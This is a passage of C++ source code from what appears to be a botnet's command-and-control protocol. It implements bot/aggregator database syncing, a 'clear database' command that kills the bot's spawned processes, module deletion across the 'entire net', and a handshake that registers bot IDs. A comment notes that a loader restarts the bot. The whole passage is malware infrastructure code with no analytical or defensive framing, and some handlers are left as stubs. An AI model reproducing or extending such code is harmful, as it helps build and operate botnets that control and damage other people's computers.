		i != this->raw_sync_objects->end(); i++, current_raw_element++)
	{
		mem::copy((LPVOID)current_raw_element, *i, sizeof(raw_sync_element));
	}

	// Send response
	bool send_status = active_socket.send_data(*ResponseBuffer);
	if (send_status == false) {
#ifdef DEBUG_OUT
		DBGOUT("[!] Failed to send sync database response. Invalid handle?\n");
#endif
		return;
	}

	this->is_sync_ok = true;

	return;
}		  

// Send out request data
bool proto_sync_bot::process_initial(void)
{
	Buffer2 RawRequest = new mem::buffer2(sizeof(request_header));
	mem::copy(**RawRequest, (LPCVOID)this->RequestHeader.get_value(), sizeof(request_header));

	bool send_status = this->current_connection->send_data(*RawRequest);
	if (send_status != true) {
#ifdef DEBUG_OUT
		DBGOUT("[!] Failed to send sync request header!\n");
#endif
		return false;
	}

	return true;
}

// Do nothing
bool proto_sync_agg::process_initial(void) 
{	
	// Check if the construction of the object returned ok
	return this->is_sync_ok;
}

// Process response data from server
bool proto_sync_bot::process_response(void)
{
	this->sync_id = 0;

	// Wait for data to come in											  
	socket_tools::socket_data::WAIT_ERROR wait_status = this->current_connection->wait_for_data(
		bot_protocol::sync_db_cmd_timeout_s, 
		bot_protocol::sync_db_cmd_timeout_ms);
	if (wait_status != socket_tools::socket_data::WAIT_ERROR_DATA_AVAILABLE) {
#ifdef DEBUG_OUT
		DBGOUT("[!] No sync command response from server!\n");
#endif
		return false;
	}

	socket_tools::data *response_data = this->current_connection->wait_for_data_get_data(
		NULL, NULL);
	mem::buffer2 *response_buffer = response_data->get_buffer();

	// Check header
	this->ResponseHeader = new raw_header();
	mem::copy(this->ResponseHeader.get_value(), (LPCVOID)**response_buffer, sizeof(raw_header));
	if (mem::compare(this->ResponseHeader->signature, 
		bot_protocol::_sig_sync, sizeof(bot_protocol::_sig_sync)) != false) 
	{
#ifdef DEBUG_OUT
		DBGOUT("[!] Invalid response header\n");
#endif
		return false;
	}

	this->sync_id = this->ResponseHeader->number_of_syncs;

	// Check for header size equivalency
	if (this->ResponseHeader->number_of_syncs == 0) {
		if (response_buffer->get_raw_size() != sizeof(raw_header)) {
#ifdef DEBUG_OUT
			DBGOUT("[!] Invalid response header\n");
#endif
			return false;
		}

		// Number of syncs is zero, so none exist yet
		this->ReceivedSyncObjects = new std::vector<raw_sync_element *>();

		return true;
	} else {
		if (response_buffer->get_raw_size() != 
			(sizeof(raw_header) + 
			(this->ResponseHeader->number_of_syncs * sizeof(raw_sync_element)))) 
		{
#ifdef DEBUG_OUT
			DBGOUT("[!] Invalid response header\n");
#endif
			return false;
		}
	}
					  
	// Generate sync objects
	if (!this->ReceivedSyncObjects.get_is_null()) {
		this->ReceivedSyncObjects = NULL;
	}

	this->ReceivedSyncObjects = new std::vector<raw_sync_element *>;
	PRAW_SYNC_ELEMENT current_element = (PRAW_SYNC_ELEMENT)((DWORD_PTR)**response_buffer +
		sizeof(raw_header));
	for (UINT i = 0; i < this->ResponseHeader->number_of_syncs; i++, current_element++) {
		PRAW_SYNC_ELEMENT tmp_element = (PRAW_SYNC_ELEMENT)mem::malloc(sizeof(raw_sync_element));
		mem::copy(tmp_element, current_element, sizeof(raw_sync_element));

		this->ReceivedSyncObjects->push_back(tmp_element);
	}  

	// Process list
	bool process_status = process_sync_list(*this->ReceivedSyncObjects);
	if (process_status != true) {
#ifdef DEBUG_OUT
		DBGOUT("[!] Failed to process sync database\n");
#endif
		return false;
	}

	return true;
}

// Do nothing
bool proto_sync_agg::process_response(void)
{
	return true;
}

// Obsolete
bool proto_sync_bot::process_sync_list(__in const std::vector<raw_sync_element *>& sync_elements)
{
	std::vector<raw_sync_element *> *db = NULL;	  

	return true;
}

bot_protocol::proto_sync::RAW_SYNC_ELEMENT *proto_sync::get_sync_element(__in const SIG_ID id) const
{
	return this->ReceivedSyncObjects->at(id);
}

/*--------[Command: Clear Database]---------------------------------------------------------*/
proto_cleardb_agg::proto_cleardb_agg(__in const socket_tools::socket_data& bot_connection,
									 __in const id_info::id& bot_id)
{
	this->active_connection = &bot_connection;
	this->command = new cleardb();

	this->command->id = bot_id.get_dword();
}

bool proto_cleardb_agg::process(void)
{
	// Send
	Buffer2 RawCommand = new mem::buffer2(sizeof(cleardb));
	mem::copy(**RawCommand, this->command, sizeof(cleardb));
	
	bool send_status = this->active_connection->send_data(*RawCommand);
	if (send_status != true) {
		return false;
	}

	return true;
}

proto_cleardb_bot::proto_cleardb_bot(__in const socket_tools::data& raw_request,
									 __in const id_info::id& bot_id)
{
	this->active_connection = NULL;
	this->command = new cleardb();
	this->id = &bot_id;

	if (raw_request.get_size() != sizeof(cleardb)) {
		return;
	}

	mem::copy(this->command, raw_request.get_buffer2(), sizeof(cleardb));
}

// Verifies command, Destroys the database, restarts the process
bool proto_cleardb_bot::process(void)
{
	if (this->command == NULL) {
		return false;
	}

	// Validate signature
	if (str::compareA((LPCSTR)this->command->signature, _sig_cleardb, str::lenA(_sig_cleardb))) {
		return false;
	}

	// Validate bot id
	if (this->command->id != this->id->get_dword()) {
		return false;
	}

	// Destroy all module spawns
	spawn::destroy_all_spawned_processes(spawn::get_all_spawned_processes());

	// Destroy the database
	module::get_active_database()->destroy_db();

	// Exit	- the loader will bring up the bot again
	//EXIT(default_exit_time);

	return true;
}

/*--------[Command: Delete module]----------------------------------------------------------*/
bool bot_protocol::handler_test_delete(__in const text_io::input& raw_data,
									   __inout std::vector<bot_protocol::instance *>& active_instances)
{
	if (raw_data.get_raw_size() < str::lenA(_sig_delete)) {
		return false;
	}

	Ptr<std::vector<LPSTR>> RawTokens = raw_data.get_string()->split_string_by_terminatorA(NULL,
		command_split_token, str::ASCII_CHAR);
	if (RawTokens->size() < (_proto_delete_max_number_of_elements + 1)) {
		return false;
	}

	if ((str::lenA((*RawTokens)[0]) != str::lenA(_sig_delete)) ||
		str::compareA((*RawTokens)[0], _sig_delete, str::lenA(_sig_delete))) {
		return false;
	}
	
	return true;
}

bool bot_protocol::handler_delete(__in const text_io::input& raw_data,
								  __inout std::vector<bot_protocol::instance *>& active_instances)
{
	// Check if there exist any elements
	if (db_sync::get_sync_database()->get_sync_id() == 0) {
#ifdef DEBUG_OUT
		DBGOUT("[+] No objects exist\n");
#endif
		return true;
	}

	Ptr<std::vector<LPSTR>> RawTokens = raw_data.get_string()->split_string_by_terminatorA(NULL,
		command_split_token, str::ASCII_CHAR);
	StrString Name = new str_string((*RawTokens)[2]);

	// Delete from database
	bool remove_status = db_sync::get_sync_database()->remove_sync_element(*Name);
	if (remove_status != true) return false;

	if ((str::lenA((*RawTokens)[1]) == _sig_all_length) &&
		(!str::compareA((*RawTokens)[1], bot_protocol::_sig_all, _sig_all_length))) {
		// Entire net
#ifdef DEBUG_OUT
		DBGOUT("[+] Deleting module %s from entire net.\n", (*RawTokens)[2]);
#endif

	   for (std::vector<instance *>::iterator i = active_instances.begin();
		   i != active_instances.end(); i++) 
	   {
			(*i)->command_delete(raw_data);
	   }

	} else {
		// Specific bot
		DebugBreak();
	}

	return true;
}

bool bot_protocol::process_delete(__in const socket_tools::data& raw_data,
								  __in const id_info::id& id)
{
	Ptr<bot_protocol::proto_delete> Delete = new bot_protocol::proto_delete_bot(raw_data, id);
	bool process_status = Delete->process();
	if (process_status == false) {
#ifdef DEBUG_OUT
		DBGOUT("[!] Failed to processes Delete\n");
#endif
		return false;
	}

	return true;
}

bot_protocol::proto_delete_bot::proto_delete_bot(__in const socket_tools::data& raw_data,
												 __in const id_info::id& id)
{
	this->RawData = new mem::buffer2(raw_data.get_buffer2(), raw_data.get_size());
	this->raw_header = (PDELETE_RAW)mem::malloc(sizeof(delete_raw));
	this->bot_id = const_cast<id_info::id *>(&id);
}

bot_protocol::proto_delete_agg::proto_delete_agg(__in const socket_tools::socket_data& current_connection,
												 __in const str_string& module_name,
												 __in const id_info::id& id)
{
	this->ModuleName = new str_string(*module_name);

	this->RawData = NULL;
	this->raw_header = (PDELETE_RAW)mem::malloc(sizeof(delete_raw));
	this->raw_header->id = id.get_dword();
	this->raw_header->module_name_size = module_name.lenA() + str::ASCII_CHAR;
	this->connection = const_cast<socket_tools::socket_data *>(&current_connection);

	this->RawData = new mem::buffer2(sizeof(delete_raw) + module_name.lenA() + str::ASCII_CHAR);
	mem::copy(**RawData, this->raw_header, sizeof(delete_raw));
	mem::copy((LPVOID)((DWORD_PTR)**RawData + sizeof(delete_raw)), *module_name, module_name.lenA()); 
}

bool bot_protocol::proto_delete_bot::process(void)
{
	// Check sizes
	mem::copy(this->raw_header, **this->RawData, sizeof(delete_raw));
	if (this->RawData->get_raw_size() != 
		(sizeof(delete_raw) + this->raw_header->module_name_size + str::ASCII_CHAR)) 
	{
		return false;
	}

	if (this->raw_header->id !=	this->bot_id->get_dword()) {
		return false;
	}

	// Remove from db

	// Terminate instances


	return true;
}

bool bot_protocol::proto_delete_agg::process(void)
{
	if (this->RawData == NULL) return false;

	bool send_status = this->connection->send_data(*this->RawData);
	if (send_status != true) return false;

	return true;
}

bool instance::command_delete(__in const text_io::input& raw_data) const
{
	Ptr<std::vector<LPSTR>> RawTokens = raw_data.get_string()->split_string_by_terminatorA(NULL,
		command_split_token, str::ASCII_CHAR);
	if (RawTokens->size() != 4) {
		return false;
	}
	StrString Name = new str_string((*RawTokens)[2]);

	Ptr<bot_protocol::proto_delete> Delete = new bot_protocol::proto_delete_agg(*this->CommSocket,
		*Name, this->get_bot_id_());
	bool process_status = Delete->process();
	if (process_status != true) {
		return false;
	}				 

	return true;
}

/*--------[Instance]------------------------------------------------------------------------*/
bool bot_protocol::instance::receive_proto_hello(__in socket_tools::socket_data *tx_socket) 
{
	socket_tools::socket_data::WAIT_ERROR wait_status = 
		tx_socket->wait_for_data(bot_protocol::timeout_hello_s, 
		bot_protocol::timeout_hello_ms);
	if (wait_status == socket_tools::socket_data::WAIT_ERROR_NOTHING_RECEIVED) {
		return false;
	}

	this->hello_data = tx_socket->wait_for_data_get_data(NULL, NULL);
	if (this->hello_data == NULL) {
		return false;
	}

	this->ProtoHello = new proto_hello(this->hello_data, tx_socket);
	bool hello_status = ProtoHello->get_is_request_ok();
	if (hello_status == false) {
		return false;
	}

	// Send the OK response
	bool response_status = ProtoHello->send_response();
	if (response_status == false) {
		return false;
	}

	this->bot_id_dword = this->ProtoHello->get_id()->get_dword();

	return true;
}

bool instance::add_module(__in const text_io::input& raw_data) const
{
	Ptr<proto_add_module> AddModule = new proto_add_module(
		this->CommSocket.get_value(),
		raw_data);

	if (AddModule->get_is_ok() == false) {
		return false;
	}

	bool send_status = AddModule->send_command();
	if (send_status == false) {
		return false;
	}

	return true;	
}


